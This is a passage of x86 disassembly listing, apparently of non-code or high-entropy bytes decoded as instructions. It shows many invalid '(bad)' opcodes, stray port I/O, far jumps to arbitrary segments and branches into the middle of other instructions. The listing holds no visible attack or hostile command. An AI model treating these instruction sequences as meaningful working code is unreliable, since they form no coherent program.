  52df2f:	int3   
  52df30:	xor    al,0x5b
  52df32:	jb     0x52dec6
  52df34:	add    ch,BYTE PTR [esp+esi*1+0x3c]
  52df38:	daa    
  52df39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52df3a:	or     al,0x87
  52df3c:	xor    eax,0x3ffedd53
  52df41:	pop    ss
  52df42:	mov    WORD PTR [ebx-0x215dfa62],ss
  52df48:	in     eax,0xc3
  52df4a:	aad    0xfb
  52df4c:	cmp    al,0x48
  52df4e:	jmp    0x52df3f
  52df50:	or     eax,0x7cd545c5
  52df55:	retf   
  52df56:	stc    
  52df57:	and    ah,BYTE PTR [edi+0x2442e4cd]
  52df5d:	out    0x38,al
  52df5f:	push   esi
  52df60:	and    esp,DWORD PTR ds:[edx]
  52df63:	stos   BYTE PTR es:[edi],al
  52df64:	js     0x52deff
  52df66:	dec    edx
  52df67:	test   eax,0xe8be4a98
  52df6c:	and    dh,ch
  52df6e:	mov    DWORD PTR [edi-0x22],0xdc87a0be
  52df75:	popf   
  52df76:	or     esi,ecx
  52df78:	pop    ebx
  52df79:	xchg   ecx,eax
  52df7a:	int3   
  52df7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52df7c:	aad    0x64
  52df7e:	test   BYTE PTR [eax+0x3dbc93a],bl
  52df84:	aam    0x30
  52df86:	mov    bl,0x93
  52df88:	mov    ah,0x76
  52df8a:	xchg   ch,bl
  52df8c:	loope  0x52dff5
  52df8e:	sbb    al,BYTE PTR [esi+ebp*2]
  52df91:	adc    eax,0xa958d830
  52df96:	xchg   ecx,eax
  52df97:	inc    ebx
  52df98:	icebp  
  52df99:	cmp    al,ah
  52df9b:	neg    DWORD PTR [ebx+0x7c]
  52df9e:	fbld   TBYTE PTR [eax+eiz*4-0x2b]
  52dfa2:	out    dx,eax
  52dfa3:	pushf  
  52dfa4:	lock rcr DWORD PTR [esp+ecx*1],0x10
  52dfa9:	jmp    0xb2ad:0xdbfc2fe9
  52dfb0:	xchg   esp,eax
  52dfb1:	mov    edi,0x36f18d99
  52dfb6:	mov    ds:0x28864489,eax
  52dfbb:	aad    0xe7
  52dfbd:	jmp    0x52e01e
  52dfbf:	rcl    BYTE PTR [edi-0x32921350],0xd2
  52dfc6:	jno    0x52dfde
  52dfc8:	sub    cl,BYTE PTR [edi+0x64]
  52dfcb:	je     0x52dfe2
  52dfcd:	inc    ebx
  52dfce:	stc    
  52dfcf:	imul   ecx,DWORD PTR [ebp-0x1ec050ab],0x8435baff
  52dfd9:	sub    eax,0xaf20dccb
  52dfde:	aas    
  52dfdf:	(bad)  
  52dfe0:	mov    al,ds:0xba6f6a7b
  52dfe5:	mov    edi,0x673589e
  52dfea:	in     eax,dx
  52dfeb:	add    al,0x55
  52dfed:	cmp    ecx,DWORD PTR [ebp+0x22]
  52dff0:	stos   DWORD PTR es:[edi],eax
  52dff1:	idiv   ebp
  52dff3:	outs   dx,DWORD PTR ds:[esi]
  52dff4:	fst    QWORD PTR [eax+ebp*2-0x79]
  52dff8:	jecxz  0x52dfe9
  52dffa:	xchg   esi,eax
  52dffb:	pop    eax
  52dffc:	pop    es
  52dffd:	(bad)  
  52dffe:	push   ebx
  52dfff:	jo     0x52e00c
  52e001:	push   0x5b0dd365
  52e006:	sbb    ah,ch
  52e008:	push   ebp
  52e009:	and    BYTE PTR [ecx-0x3fdae9a4],al
  52e00f:	les    eax,FWORD PTR [ecx+ecx*4-0x28]
  52e013:	hlt    
  52e014:	or     eax,0xdb6b330a
  52e019:	cmp    al,0x55
  52e01b:	or     al,BYTE PTR ds:0xa99efc2a
  52e021:	loop   0x52e030
  52e023:	jnp    0x52e038
  52e025:	retf   0x9b89
  52e028:	or     ebx,esp
  52e02a:	mov    edi,0x17df79d4
  52e02f:	popf   
  52e030:	cmp    eax,0x3da4f5a0
  52e035:	adc    cl,BYTE PTR [ecx]
  52e037:	fdiv   st,st(6)
  52e039:	inc    eax
  52e03a:	mov    edx,0x64558cc1
  52e03f:	outs   dx,BYTE PTR ds:[esi]
  52e040:	jne    0x52e0af
  52e042:	pop    edx
  52e043:	xchg   ebx,eax
  52e044:	bound  edi,QWORD PTR [edi]
  52e046:	jecxz  0x52e04c
  52e048:	mov    al,ds:0xacd6ee42
  52e04d:	sbb    al,0xa0
  52e04f:	cs test BYTE PTR cs:[edx],ah
  52e053:	cs push esi
  52e055:	push   edi
  52e056:	ins    DWORD PTR es:[edi],dx
  52e057:	pop    ebp
  52e058:	jnp    0x52e08e
  52e05a:	add    bh,BYTE PTR [ebp-0x2c654095]
  52e060:	add    ah,dh
  52e062:	adc    al,0x2c
  52e064:	adc    eax,0x42cabda8
  52e069:	xchg   edx,eax
  52e06a:	push   ebx
  52e06b:	add    al,0x54
  52e06d:	jecxz  0x52e043
  52e06f:	cmp    dl,BYTE PTR [ebx+0x472b4819]
  52e075:	pop    ebp
  52e076:	in     al,dx
  52e077:	push   esp
  52e078:	dec    esp
  52e079:	lahf   
  52e07a:	or     ah,BYTE PTR [edx-0x20]
  52e07d:	xchg   ch,cl
  52e07f:	pop    eax
  52e080:	into   
  52e081:	int    0x5a
  52e083:	in     eax,dx
  52e084:	(bad)  [ecx]
  52e086:	stos   BYTE PTR es:[edi],al
  52e087:	(bad)  
  52e088:	xor    eax,0xdaf76d48
  52e08d:	cmp    BYTE PTR [esi-0x5b892fbe],0xd3
  52e094:	jnp    0x52e0d3
  52e096:	ret    
  52e097:	xchg   ebx,eax
  52e098:	(bad)  
  52e099:	push   ds
  52e09a:	mov    esp,0x62d7780c
  52e09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52e0a0:	jg     0x52e0a7
  52e0a2:	push   ebx
  52e0a3:	das    
  52e0a4:	stc    
  52e0a5:	pop    ds
  52e0a6:	inc    eax
  52e0a7:	jge    0x52e0d7
  52e0a9:	repnz lock cmp ch,BYTE PTR [ecx]
  52e0ad:	sub    eax,0xe8dc081e
  52e0b2:	sub    ah,BYTE PTR [esi+eax*4+0x6f0576bd]
  52e0b9:	test   DWORD PTR [edi-0x3d766657],esp
  52e0bf:	stos   BYTE PTR es:[edi],al
  52e0c0:	jne    0x52e092
  52e0c2:	ret    
  52e0c3:	jo     0x52e0bc
  52e0c5:	not    BYTE PTR [ebx-0x3793f397]
  52e0cb:	ins    BYTE PTR es:[edi],dx
  52e0cc:	hlt    
  52e0cd:	test   BYTE PTR es:[edx+0x46],ch
  52e0d1:	jge    0x52e13c
  52e0d3:	jbe    0x52e0e5
  52e0d5:	lods   eax,DWORD PTR ds:[esi]
  52e0d6:	jno    0x52e117
  52e0d8:	pushf  
  52e0d9:	xchg   ebp,eax
  52e0da:	ins    DWORD PTR es:[edi],dx
  52e0db:	inc    BYTE PTR [ebx-0x6c]
  52e0de:	mov    edi,0x21e5791d
  52e0e3:	js     0x52e132
  52e0e5:	or     edx,DWORD PTR [esi+0x71]
  52e0e8:	test   edi,ebx
  52e0ea:	loope  0x52e0a8
  52e0ec:	call   0x1a27:0x8cf33d3d
  52e0f3:	sub    eax,0x482f6d17
  52e0f8:	icebp  
  52e0f9:	cli    
  52e0fa:	jbe    0x52e16d
  52e0fc:	or     al,BYTE PTR [eax]
  52e0fe:	jne    0x52e0b5
  52e100:	retf   0xb201
  52e103:	push   0x6e
  52e105:	push   ebp
  52e106:	dec    ebp
  52e107:	loop   0x52e0bb
  52e109:	lods   al,BYTE PTR ds:[esi]
  52e10a:	ds (bad) 
  52e10c:	sbb    eax,0x5af8ffb9
  52e111:	mov    DWORD PTR [ebx+0x1ac4c3ba],ebp
  52e117:	dec    ebp
  52e118:	aad    0x98
  52e11a:	or     eax,0x1935b928
  52e11f:	xor    DWORD PTR [esi],edi
  52e121:	xchg   ebp,eax
  52e122:	or     BYTE PTR [esi+0xa8f18c2],al
  52e128:	in     al,dx
  52e129:	mov    bh,0x6a
  52e12b:	pop    eax
  52e12c:	pop    ss
  52e12d:	pop    ebp
  52e12e:	cmc    
  52e12f:	loopne 0x52e15e
  52e131:	pop    edx
  52e132:	and    DWORD PTR [edx+0x53],edi
  52e135:	jae    0x52e1b5
  52e137:	ret    0xf8ba
  52e13a:	stc    
  52e13b:	in     al,dx
  52e13c:	jne    0x52e0f6
  52e13e:	ss push eax
  52e140:	(bad)  
  52e142:	(bad)  
  52e143:	mov    eax,ds:0x1e0dd2af
  52e148:	rol    ebx,cl
  52e14a:	cmp    eax,0x5640b291
  52e14f:	sbb    al,0xfb
  52e151:	(bad)  
  52e152:	popf   
  52e153:	leave  
  52e154:	ins    BYTE PTR es:[edi],dx
  52e155:	popf   
  52e156:	bnd jo 0x52e1a1
  52e159:	div    DWORD PTR [esi]
  52e15b:	sbb    DWORD PTR [eax+0x42c82b68],0x3674d879
  52e165:	daa    
  52e166:	std    
  52e167:	mov    BYTE PTR [ebx],ah
  52e169:	js     0x52e132
  52e16b:	fwait
  52e16c:	pop    eax
  52e16d:	call   0xb4cfb693
  52e172:	mov    ebx,0x7772eb4
  52e177:	mov    ecx,0x6edf3805
  52e17c:	pop    eax
  52e17d:	or     al,0x34
  52e17f:	leave  
  52e180:	pop    ebx
  52e181:	sti    
  52e182:	popa   
  52e183:	push   ds
  52e184:	mov    dl,0x87
  52e186:	push   ds
  52e187:	cmp    al,BYTE PTR [ecx+eiz*4+0x20]
  52e18b:	std    
  52e18c:	push   edx
  52e18d:	sub    al,0x32
  52e18f:	sub    ebx,DWORD PTR [edx+0x76]
  52e192:	lods   al,BYTE PTR ds:[esi]
  52e193:	popa   
  52e194:	add    al,0xf
  52e196:	dec    edi
  52e197:	retf   
  52e198:	clc    
  52e199:	push   edx
  52e19a:	ss adc edx,ebp
  52e19d:	(bad)
  52e1a1:	repz mov bh,0x24
  52e1a4:	dec    ebx
  52e1a5:	add    edx,DWORD PTR [eax-0x2a]
  52e1a8:	jmp    0x52e161
  52e1aa:	les    ebx,FWORD PTR [edx+0x6d]
  52e1ad:	(bad)  
  52e1ae:	sub    BYTE PTR [edi-0x4b6e0463],bh
  52e1b4:	mov    al,ds:0xefe02ab1
  52e1b9:	popa   
  52e1ba:	neg    BYTE PTR [esi-0x7e]
  52e1bd:	mov    ebx,ebp
  52e1bf:	dec    edx
  52e1c0:	xchg   BYTE PTR ds:0x6bf78112,al
  52e1c6:	inc    ebp
  52e1c7:	in     eax,0x1e
  52e1c9:	sub    bl,BYTE PTR [ebp+0x162869ff]
  52e1cf:	dec    ebx
  52e1d0:	ins    DWORD PTR es:[edi],dx
  52e1d1:	dec    esi
  52e1d2:	push   ss
  52e1d3:	lods   eax,DWORD PTR ds:[esi]
  52e1d4:	mov    dh,BYTE PTR [edi+0x4d]
  52e1d7:	das    
  52e1d8:	pop    ebp
  52e1d9:	addr16 push ds
  52e1db:	cmp    ch,cl
  52e1dd:	xchg   BYTE PTR [ecx+ecx*4-0x2e],bh
  52e1e1:	aam    0x59
  52e1e3:	and    eax,0xa08918aa
  52e1e8:	jno    0x52e202
  52e1ea:	mov    al,0xda
  52e1ec:	xor    BYTE PTR es:[ecx+0x9],al
  52e1f0:	mov    BYTE PTR [edi+edx*8],dh
  52e1f3:	pop    ss
  52e1f4:	fxch   st(2)
  52e1f6:	dec    eax
  52e1f7:	xlat   BYTE PTR ds:[ebx]
  52e1f8:	inc    edi
  52e1f9:	or     eax,esp
  52e1fb:	scas   al,BYTE PTR es:[edi]
  52e1fc:	adc    ch,BYTE PTR [ebx]
  52e1fe:	jb     0x52e19f
  52e200:	adc    esi,DWORD PTR [ebx-0xf1671e3]
  52e206:	(bad)  
  52e208:	and    DWORD PTR [ebx],esp
  52e20a:	aam    0x65
  52e20c:	push   esi
  52e20d:	mov    eax,0xed6554bb
  52e212:	cmp    ecx,ecx
  52e214:	pop    eax
  52e215:	inc    ebp
  52e216:	jnp    0x52e27e
  52e218:	out    0x19,eax
  52e21a:	std    
  52e21b:	loop   0x52e253
  52e21d:	test   DWORD PTR [esi-0x6be0836d],ecx
  52e223:	test   eax,0x9bdc74f
  52e228:	iret   
  52e229:	stos   DWORD PTR es:[edi],eax
  52e22a:	movlps xmm1,QWORD PTR [edi-0x4b9391a]
  52e231:	iret   
  52e232:	lds    ebx,FWORD PTR [eax+edi*8]
  52e235:	ja     0x52e291
  52e237:	push   eax
  52e238:	sbb    BYTE PTR [edx-0x53a35c45],0x24
  52e23f:	js     0x52e20f
  52e241:	les    esi,FWORD PTR [ebp+edi*8-0x2f755ffc]
  52e248:	frstpm(287 only) 
  52e24a:	adc    BYTE PTR [ecx+0x7408e4c4],bl
  52e250:	and    DWORD PTR [ebx+0x40f3e306],edi
  52e256:	outs   dx,BYTE PTR ds:[esi]
  52e257:	lahf   
  52e258:	cmp    DWORD PTR [ecx+0x74c05e86],edi
  52e25e:	or     al,0xd
  52e260:	call   0x61a2b44e
  52e265:	sbb    eax,0x4763b93a
  52e26a:	add    BYTE PTR [edi-0x56ae22b3],0x5c
  52e271:	jo     0x52e273
  52e273:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  52e275:	je     0x52e2e5
  52e277:	aad    0x4a
  52e279:	jns    0x52e2cf
  52e27b:	adc    DWORD PTR [esi-0x46b399e0],0x157c8e9c
  52e285:	vpsubsw xmm1,xmm5,xmm3
  52e289:	test   esi,esp
  52e28b:	in     eax,0x29
  52e28d:	mov    ds:0x5d2e817f,al
  52e292:	test   DWORD PTR [edx-0x8],ebp
  52e295:	sbb    edx,DWORD PTR [eax-0x37]
  52e298:	jnp    0x52e25c
  52e29a:	adc    DWORD PTR [esi-0xa],0xfc27cd8f
  52e2a1:	icebp  
  52e2a2:	les    ecx,FWORD PTR [edx+0x34fe5a39]
  52e2a8:	mov    DWORD PTR [esi+eiz*2+0x44c97566],eax
  52e2af:	add    bh,BYTE PTR [ebx]
  52e2b1:	and    BYTE PTR [eax-0x60395632],dl
  52e2b7:	mov    eax,0xbe5bb335
  52e2bc:	aad    0xa1
  52e2be:	pop    ecx
  52e2bf:	inc    ebp
  52e2c0:	xlat   BYTE PTR ds:[ebx]
  52e2c1:	push   eax
  52e2c2:	xlat   BYTE PTR ds:[ebx]
  52e2c3:	bound  esi,QWORD PTR [eax]
  52e2c5:	adc    DWORD PTR [ebx-0x43],0x60
  52e2c9:	xchg   edx,eax
  52e2ca:	mov    esp,0x4b2b1055
  52e2cf:	mov    dh,0xe1
  52e2d1:	cs or  ebx,esi
  52e2d4:	int    0xed
  52e2d6:	bound  esi,QWORD PTR [ebx+0x64dd790b]
  52e2dc:	pop    ss
  52e2dd:	pop    eax
  52e2de:	call   0xda8e:0x733b7454
  52e2e5:	jo     0x52e278
  52e2e7:	ss add eax,0xa4f81575
  52e2ed:	sub    DWORD PTR [ebx],ebx
  52e2ef:	sti    
  52e2f0:	loope  0x52e368
  52e2f2:	inc    ebx
  52e2f3:	(bad)  
  52e2f4:	mul    DWORD PTR [edx-0x1a]
  52e2f7:	dec    esi
  52e2f8:	pop    ss
  52e2f9:	pop    esi
  52e2fa:	in     al,dx
  52e2fb:	pop    ds
  52e2fc:	add    DWORD PTR [ebx+0x61bf0ca4],0x9232a323
  52e306:	test   BYTE PTR [ebp-0x7e41766b],0xc1
  52e30d:	mov    al,ds:0xb6d686b2
  52e312:	out    0x33,al
  52e314:	shl    BYTE PTR [esi+eax*4],cl
  52e317:	cmp    al,bl
  52e319:	mov    bl,BYTE PTR [ebx]
  52e31b:	xor    dl,BYTE PTR [eax]
  52e31d:	outs   dx,DWORD PTR ds:[esi]
  52e31e:	fdiv   QWORD PTR [ebp-0x52a759de]
  52e324:	and    DWORD PTR [ebp-0x44],ebp
  52e327:	retf   0x552c
  52e32a:	and    eax,DWORD PTR ds:0x8c46f6ca
  52e330:	jns    0x52e344
  52e332:	scas   al,BYTE PTR es:[edi]
  52e333:	sbb    DWORD PTR [edi+0x41ba8089],0xf9332107
  52e33d:	icebp  
  52e33e:	jl     0x52e356
  52e340:	retf   
  52e341:	and    ch,BYTE PTR ds:0xa7d4af87
  52e347:	mov    al,0x1e
  52e349:	and    eax,DWORD PTR [ebx+eax*4+0x549effd7]
  52e350:	mov    bh,0xe1
  52e352:	add    ah,bl
  52e354:	rcr    eax,cl
  52e356:	ror    BYTE PTR [eax-0x2a],1
  52e359:	lahf   
  52e35a:	push   edi
  52e35b:	stos   DWORD PTR es:[edi],eax
  52e35c:	adc    eax,0xa9a4c9e2
  52e361:	pop    edx
  52e362:	jp     0x52e33f
  52e364:	mov    esp,0x81d180a2
  52e369:	push   0xc
  52e36b:	(bad)
  52e36e:	cmp    al,0xa0
  52e370:	out    dx,eax
  52e371:	mov    edi,0x9df8458
  52e376:	(bad)  
  52e377:	xchg   BYTE PTR [eax+0x2e],bh
  52e37a:	jge    0x52e38b
  52e37c:	cmc    
  52e37d:	loopne 0x52e35b
  52e37f:	mov    edi,0xba0f47c0
  52e384:	test   ebx,0xc86fcaf
  52e38a:	popf   
  52e38b:	sub    al,0x78
  52e38d:	and    eax,0x4cf8609b
  52e392:	ss sub al,0x88
  52e395:	int3   
  52e396:	dec    ecx
  52e397:	cli    
  52e398:	dec    esi
  52e399:	add    al,0x44
  52e39b:	out    0xce,eax
  52e39d:	test   eax,0x9e8a3359
  52e3a2:	out    0x2a,al
  52e3a4:	mov    al,ds:0xd73436bb
  52e3a9:	add    DWORD PTR [esp+ebx*2],edx
  52e3ac:	ins    DWORD PTR es:[edi],dx
  52e3ad:	fisttp QWORD PTR [edi]
  52e3af:	clc    
  52e3b0:	fs push ecx
  52e3b2:	stos   BYTE PTR es:[edi],al
  52e3b3:	rcr    BYTE PTR [ecx+0x36],1
  52e3b6:	jnp    0x52e432
  52e3b8:	dec    BYTE PTR [edx+0x6db4d51a]
  52e3be:	pushf  
  52e3bf:	adc    al,0xd0
  52e3c1:	bound  eax,QWORD PTR [eax-0x2a]
  52e3c4:	adc    al,BYTE PTR [edx-0x34]
  52e3c7:	ins    DWORD PTR es:[edi],dx
  52e3c8:	add    DWORD PTR [edx-0x129cf593],0x24aefd5d
  52e3d2:	repz adc al,BYTE PTR ds:0x18a0beab
  52e3d9:	idiv   DWORD PTR [ebp+0x757ec5a]
  52e3df:	or     DWORD PTR [edx-0x68],edx
  52e3e2:	mov    al,0x7e
  52e3e4:	ja     0x52e451
  52e3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52e3e7:	jns    0x52e3d8
  52e3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52e3ea:	sbb    dl,BYTE PTR [edx+0xa]
  52e3ed:	push   0xffffffd1
  52e3ef:	sub    eax,ebp
  52e3f1:	jmp    0x5b0a:0xd2611ca1
  52e3f8:	xlat   BYTE PTR ds:[ebx]
  52e3f9:	sbb    edx,edi
  52e3fb:	or     cl,BYTE PTR [edi-0x22]
  52e3fe:	inc    eax
  52e3ff:	push   ebp
  52e400:	jmp    0x52e390
  52e402:	test   BYTE PTR [edi+0x24],bl
  52e405:	in     al,dx
  52e406:	lds    edx,FWORD PTR [eax]
  52e408:	aam    0xe4
  52e40a:	std    
  52e40b:	pop    ebp
  52e40c:	test   eax,0xdc35812e
  52e411:	mov    BYTE PTR [edx-0x451a4ccb],ch
  52e417:	ret    0x7b2c
  52e41a:	enter  0xf7b2,0xd8
  52e41e:	fldenv [eax]
  52e420:	dec    ecx
  52e421:	lods   al,BYTE PTR ds:[esi]
  52e422:	or     eax,0xdbdb79a7
  52e427:	or     DWORD PTR [esi],ebp
  52e429:	pop    ds
  52e42a:	fisttp WORD PTR [ecx*4-0x3284bc19]
  52e431:	rol    BYTE PTR [ebx+0x414a6158],0x18
  52e438:	cmp    eax,0xa3e78fc
  52e43d:	outs   dx,DWORD PTR ds:[esi]
  52e43e:	test   al,0xb9
  52e440:	cmp    al,0xbb
  52e442:	or     ecx,edx
  52e444:	aad    0x8e
  52e446:	sub    edx,DWORD PTR [ebx+0xe52ecea]
  52e44c:	fild   DWORD PTR [esi-0x2e662306]
  52e452:	ins    DWORD PTR es:[edi],dx
  52e453:	dec    esp
  52e454:	nop
  52e455:	dec    esp
  52e456:	pop    ebx
  52e457:	inc    ecx
  52e458:	cmp    eax,0xb8be2931
  52e45d:	cmp    BYTE PTR [esi+0x27],dh
  52e460:	cmp    eax,0x44d5626f
  52e465:	xchg   ebp,eax
  52e466:	and    BYTE PTR [ecx],al
  52e468:	sbb    eax,DWORD PTR [ebp+0x6d]
  52e46b:	inc    ebx
  52e46c:	std    
  52e46d:	fcom   QWORD PTR [edi-0x32]
  52e470:	test   ebp,ecx
  52e472:	push   ebx
  52e473:	pop    ds
  52e474:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52e476:	lods   al,BYTE PTR ds:[esi]
  52e477:	(bad)  
  52e478:	sub    BYTE PTR [edx+edi*8-0x2a1dd2a2],cl
  52e47f:	fs jno 0x52e449
  52e482:	out    0x1,al
  52e484:	jp     0x52e474
  52e486:	jmp    0x52e4ef
  52e488:	cmp    al,0x59
  52e48a:	pop    es
  52e48b:	or     al,0xc8
  52e48d:	into   
  52e48e:	imul   ebp,DWORD PTR [ebp-0x3b],0xffffffd6
  52e492:	jge    0x52e43d
  52e494:	mov    ecx,0xd17a4086
  52e499:	inc    esp
  52e49a:	cmp    ebx,DWORD PTR [ebp+0x56d4640e]
  52e4a0:	and    BYTE PTR [ebx],ch
  52e4a2:	pop    ebp
  52e4a3:	push   esp
  52e4a4:	push   0xa
  52e4a6:	aas    
  52e4a7:	stos   DWORD PTR es:[edi],eax
  52e4a8:	imul   ecx
  52e4aa:	mov    edx,0x7ba55827
  52e4af:	in     eax,0x76
  52e4b1:	out    dx,eax
  52e4b2:	ss push ss
  52e4b4:	xor    cl,BYTE PTR [edx-0x7c3c096a]
  52e4ba:	in     al,0xfa
  52e4bc:	(bad)  
  52e4be:	mov    ds:0x4f24b7f1,eax
  52e4c3:	jge    0x52e50c
  52e4c5:	add    eax,0xd5fb86da
  52e4ca:	popa   
  52e4cb:	inc    esp
  52e4cc:	js     0x52e4ac
  52e4ce:	aas    
  52e4cf:	cmp    esi,DWORD PTR [ecx]
  52e4d1:	xor    BYTE PTR [ebp-0x3579df3b],0xcf
  52e4d8:	mov    dl,0x9e
  52e4da:	sub    edx,esi
  52e4dc:	fnstsw WORD PTR [ecx-0x5b]
  52e4df:	(bad)  
  52e4e0:	dec    edi
  52e4e1:	popa   
  52e4e2:	mov    DWORD PTR [eax-0x65e7c0b3],ecx
  52e4e8:	mov    ebp,0x32ab9450
  52e4ed:	pop    edx
  52e4ee:	xor    edx,esi
  52e4f0:	std    
  52e4f1:	dec    ebx
  52e4f2:	mov    edx,0x73a5c7c0
  52e4f7:	xchg   esi,eax
  52e4f8:	imul   ecx,DWORD PTR [esi+0x1034bc4a],0xffffff9e
  52e4ff:	jns    0x52e4f3
  52e501:	jb     0x52e55e
  52e503:	idiv   DWORD PTR [eax+0x76]
  52e506:	sbb    DWORD PTR [edx+eiz*4+0x7],ebp
  52e50a:	jl     0x52e499
  52e50c:	add    BYTE PTR [esp+ecx*8-0x55225eff],dh
  52e513:	cmp    DWORD PTR [ecx-0x20],eax
  52e516:	lock push ebp
  52e518:	ss ss stos DWORD PTR es:[edi],eax
  52e51b:	inc    edx
  52e51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52e51d:	jns    0x52e4b3
  52e51f:	inc    esi
  52e520:	mov    ebp,0xf8393228
  52e525:	jge    0x52e4cf
  52e527:	(bad)  
  52e528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52e529:	cmc    
  52e52a:	pop    ds
  52e52b:	lods   al,BYTE PTR ds:[esi]
  52e52c:	ins    DWORD PTR es:[edi],dx
  52e52d:	or     edx,DWORD PTR [eax+0x1a]
  52e530:	pop    ebp
  52e531:	and    al,0x4d
  52e533:	out    dx,eax
  52e534:	xchg   esp,eax
  52e535:	mov    ch,0xae
  52e537:	mov    edi,0x3c643db
  52e53c:	push   ecx
  52e53d:	fnstcw WORD PTR [ecx+ebp*8]
  52e540:	std    
  52e541:	mov    bh,0x36
  52e543:	fisttp WORD PTR [eax+0x1d8169af]
  52e549:	mov    esp,0xa4ce62f4
  52e54e:	ins    DWORD PTR es:[edi],dx
  52e54f:	mov    ds:0xabfc8f33,al
  52e554:	xchg   esi,eax
  52e555:	sub    eax,0x6ee7e9be
  52e55a:	sbb    bh,ah
  52e55c:	or     DWORD PTR [edx],edx
  52e55e:	je     0x52e5c1
  52e560:	push   eax
  52e561:	mov    esp,0x9c1e74ac
  52e566:	fdiv   DWORD PTR [ecx]
  52e568:	sbb    BYTE PTR [ebx+eiz*1-0x7a3f215],cl
  52e56f:	out    dx,eax
  52e570:	push   eax
  52e571:	add    edx,DWORD PTR [esi+0x31]
  52e574:	mov    ecx,0x4ff18a21
  52e579:	jno    0x52e5f9
  52e57b:	test   DWORD PTR [ebx-0x46],edx
  52e57e:	mov    dl,0x68
  52e580:	dec    esi
  52e581:	mov    ds:0x34a80214,al
  52e586:	bound  edx,QWORD PTR [edi]
  52e588:	shl    DWORD PTR [edi-0xe],0xdd
  52e58c:	rcl    DWORD PTR [edi+0x4b],cl
  52e58f:	das    
  52e590:	sbb    BYTE PTR ds:0x9aa92793,bh
  52e596:	cmc    
  52e597:	push   eax
  52e598:	stos   BYTE PTR es:[edi],al
  52e599:	arpl   WORD PTR [ecx],bp
  52e59b:	mov    cl,0x5b
  52e59d:	or     eax,0xab803765
  52e5a2:	jo     0x52e565
  52e5a4:	cmp    eax,DWORD PTR [edx]
  52e5a6:	pop    edx
  52e5a7:	pop    ebx
  52e5a8:	test   al,0x82
  52e5aa:	jo     0x52e57e
  52e5ac:	in     al,0x3e
  52e5ae:	jbe    0x52e62a
  52e5b0:	or     BYTE PTR [ebp+0x36da917e],bh
  52e5b6:	out    dx,eax
  52e5b7:	xchg   esp,eax
  52e5b8:	call   0xf195:0x9ab152a8
  52e5bf:	mov    esp,0x6192e650
  52e5c4:	repnz mov esi,0x28bdb4a8
  52e5ca:	cli    
  52e5cb:	pop    ebp
  52e5cc:	mov    dh,0x11
  52e5ce:	ror    ah,1
  52e5d0:	mov    ecx,0xde9807f0
  52e5d5:	adc    DWORD PTR [edi],0x20342702
  52e5db:	and    ebp,DWORD PTR [ebp-0x1e]
  52e5de:	dec    DWORD PTR [edi+ebp*4-0x71]
  52e5e2:	pop    eax
  52e5e3:	xchg   esp,eax
  52e5e4:	js     0x52e628
  52e5e6:	dec    eax
  52e5e7:	sbb    BYTE PTR [eax-0x11016209],al
  52e5ed:	inc    esp
  52e5ee:	xlat   BYTE PTR ds:[ebx]
  52e5ef:	cmp    eax,0x6706d2a5
  52e5f4:	push   0x32761886
  52e5f9:	not    DWORD PTR [edx]
  52e5fb:	pop    esi
  52e5fc:	sub    al,0x5b
  52e5fe:	add    al,0x22
  52e600:	cdq    
  52e601:	or     ah,ch
  52e603:	(bad)  
  52e604:	pop    ebx
  52e605:	enter  0x27ec,0xa
  52e609:	retf   
  52e60a:	or     ecx,edi
  52e60c:	adc    DWORD PTR [eax+ebp*8+0x4338524b],0x35
  52e614:	xor    esp,DWORD PTR [ebx+0x3731b746]
  52e61a:	inc    edx
  52e61b:	in     eax,0x88
  52e61d:	icebp  
  52e61e:	xchg   esp,eax
  52e61f:	cdq    
  52e620:	mov    bh,0xfd
  52e622:	push   0x84da5b88
  52e627:	mov    BYTE PTR [esi-0x52138956],ah
  52e62d:	xchg   ecx,eax
  52e62e:	stc    
  52e62f:	push   ebx
  52e630:	push   0x9b6b27b5
  52e635:	cmp    BYTE PTR [edi+0xe59edbd],cl
  52e63b:	imul   ecx,DWORD PTR [edi+0x2a142fe9],0xffffffd9
  52e642:	in     al,dx
  52e643:	mov    al,ds:0xcb58604b
  52e648:	adc    eax,0x5574ad1b
  52e64d:	pop    edi
  52e64e:	scas   eax,DWORD PTR es:[edi]
  52e64f:	push   eax
  52e650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52e651:	inc    edx
  52e652:	jg     0x52e650
  52e654:	pop    edx
  52e655:	jl     0x52e67e
  52e657:	test   al,0xb9
  52e659:	(bad)  
  52e65a:	xlat   BYTE PTR ds:[ebx]
  52e65b:	cmp    esp,DWORD PTR [ebp-0x21bda00]
  52e661:	aad    0xe3
  52e663:	jns    0x52e69c
  52e665:	and    BYTE PTR [edx+0x2],0x74
  52e669:	(bad)  
  52e66a:	mov    ecx,?
  52e66c:	aas    
  52e66d:	push   eax
  52e66e:	jge    0x52e645
  52e670:	jle    0x52e6b9
  52e672:	xor    BYTE PTR [edi-0x1fe2bf32],al
  52e678:	(bad)  
  52e67a:	and    bh,BYTE PTR [esi]
  52e67c:	add    DWORD PTR [eax],ebp
  52e67e:	pop    esi
  52e67f:	fsubr  DWORD PTR [ecx-0x35]
  52e682:	sbb    eax,DWORD PTR [edi-0x5d]
  52e685:	xchg   DWORD PTR [edx],ebx
  52e687:	xchg   edx,eax
  52e688:	sbb    eax,0x13150de8
  52e68d:	sar    BYTE PTR [ebp-0x239ca63a],1
  52e693:	lds    ebx,FWORD PTR [ebx]
  52e695:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  52e697:	mov    ecx,0x4b3fb29e
  52e69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52e69d:	jp     0x52e6fd
  52e69f:	jnp    0x52e633
  52e6a1:	add    ebp,DWORD PTR [esi]
  52e6a3:	xchg   esp,eax
  52e6a4:	loopne 0x52e6e7
  52e6a6:	arpl   bp,sp
  52e6a8:	dec    edx
  52e6a9:	adc    al,0xfc
  52e6ab:	jmp    0x52e691
  52e6ad:	mov    esi,0x9d533716
  52e6b2:	sbb    BYTE PTR [esi-0x38],0xbe
